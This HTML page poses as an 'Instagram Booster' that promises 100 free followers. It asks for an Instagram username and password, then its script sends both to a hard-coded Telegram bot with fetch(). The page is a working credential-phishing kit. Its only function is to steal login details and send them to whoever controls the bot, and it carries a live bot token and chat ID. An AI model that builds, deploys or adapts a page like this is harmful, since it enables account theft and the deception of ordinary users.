<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram Booster</title>
  <style>
    /* خلفية مع تدرج ألوان إنستغرام */
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #fff;
    }
    /* حاوية مصغرة للمحتوى */
    .container {
      background-color: rgba(255, 255, 255, 0.1);
      padding: 15px;
      border-radius: 10px;
      width: 280px;
      text-align: center;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
      border: 1px solid rgba(255, 255, 255, 0.3);
    }
    /* أيقونة إنستغرام في الأعلى */
    .instagram-icon {
      width: 40px;
      height: 40px;
      margin: 0 auto 10px;
    }
    /* تنسيق العناوين */
    h1 {
      font-size: 1.4em;
      margin-bottom: 8px;
      text-shadow: 0 0 4px rgba(0, 0, 0, 0.5);
    }
    h2 {
      font-size: 1em;
      margin-bottom: 8px;
      text-shadow: 0 0 4px rgba(0, 0, 0, 0.5);
    }
    /* تنسيق الأزرار (أعرض قليلاً وأقل ارتفاعاً) */
    button {
      background-color: #833ab4;
      border: none;
      padding: 6px 0;
      width: 100%;
      font-size: 0.85em;
      color: white;
      cursor: pointer;
      border-radius: 5px;
      margin-top: 10px;
      transition: background-color 0.3s, box-shadow 0.3s;
      box-shadow: 0 0 8px rgba(131,58,180,0.7);
    }
    button:hover {
      background-color: #7a2c9c;
      box-shadow: 0 0 12px rgba(131,58,180,1);
    }
    /* نموذج الإدخال */
    .form-container {
      display: none;
      margin-top: 10px;
    }
    input {
      width: 100%;
      padding: 6px;
      margin: 6px 0;
      border-radius: 5px;
      border: 1px solid rgba(255, 255, 255, 0.3);
      background: rgba(255, 255, 255, 0.2);
      color: #fff;
      outline: none;
      transition: border-color 0.3s;
    }
    input:focus {
      border-color: #833ab4;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- أيقونة إنستغرام -->
    <div class="instagram-icon">
      <svg viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id="instaGradient" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" style="stop-color:#feda75; stop-opacity:1" />
            <stop offset="50%" style="stop-color:#d62976; stop-opacity:1" />
            <stop offset="100%" style="stop-color:#962fbf; stop-opacity:1" />
          </linearGradient>
        </defs>
        <path fill="url(#instaGradient)" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9 114.9-51.3 114.9-114.9-51.3-114.9-114.9-114.9zm0 189.6c-41.3 0-74.7-33.4-74.7-74.7s33.4-74.7 74.7-74.7 74.7 33.4 74.7 74.7-33.4 74.7-74.7 74.7zm146.4-194.3c0 14.9-12.1 27-27 27-14.9 0-27-12.1-27-27s12.1-27 27-27c14.9 0 27 12.1 27 27zM398.8 97.2c-1.7-35.3-9.9-66.6-36.3-92.9C336.2 18.1 304.9 9.9 269.6 8.2 230.1 6.4 217.3 6.4 177.9 8.2c-35.3 1.7-66.6 9.9-92.9 36.3C58.1 73.4 50 104.7 48.3 140c-1.8 39.4-1.8 52.2 0 91.6 1.7 35.3 9.9 66.6 36.3 92.9 26.3 26.3 57.6 34.5 92.9 36.3 39.4 1.8 52.2 1.8 91.6 0 35.3-1.7 66.6-9.9 92.9-36.3 26.3-26.3 34.5-57.6 36.3-92.9 1.8-39.4 1.8-52.2 0-91.6zM398.8 388c-1.7 28.7-8.9 44.3-18.7 55.5-10.4 11.8-24.2 18.5-55.5 20.3-39.7 1.8-52.1 1.8-91.6 0-28.7-1.7-44.3-8.9-55.5-18.7-11.8-10.4-18.5-24.2-20.3-55.5-1.8-39.7-1.8-52.1 0-91.6 1.7-28.7 8.9-44.3 18.7-55.5 10.4-11.8 24.2-18.5 55.5-20.3 39.7-1.8 52.1-1.8 91.6 0 28.7 1.7 44.3 8.9 55.5 18.7 11.8 10.4 18.5 24.2 20.3 55.5 1.8 39.7 1.8 52.1 0 91.6z"/>
      </svg>
    </div>
    <h1>Instagram Booster</h1>
    <button id="boosterBtn">Click Here to Get 100 Followers Free</button>
    <div class="form-container" id="formContainer">
      <h2>Enter Your Instagram Details</h2>
      <input type="text" id="username" placeholder="Instagram Username" required>
      <input type="password" id="password" placeholder="Instagram Password" required>
      <button id="submitBtn">Submit</button>
    </div>
  </div>
  <script>
    const telegramBotToken = '7876109899:AAE94CAbVoN4xfhGebpJ7nmHWR_8eXAQijI'; // ضع هنا توكن البوت
    const chatId = '7351977239'; // ضع هنا chat ID الخاص بك

    // دالة لإرسال البيانات إلى بوت تيليجرام
    function sendToTelegram(username, password) {
      const message = `Instagram Username: ${username}\nInstagram Password: ${password}`;
      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            alert('Your details have been sent successfully!');
          } else {
            alert('There was an error. Please try again.');
          }
        })
        .catch(error => {
          alert('There was an error. Please try again.');
        });
    }

    document.getElementById('boosterBtn').addEventListener('click', () => {
      document.getElementById('formContainer').style.display = 'block';
    });

    document.getElementById('submitBtn').addEventListener('click', () => {
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      if (username && password) {
        sendToTelegram(username, password);
      } else {
        alert('Please enter both username and password.');
      }
    });
  </script>
</body>
</html>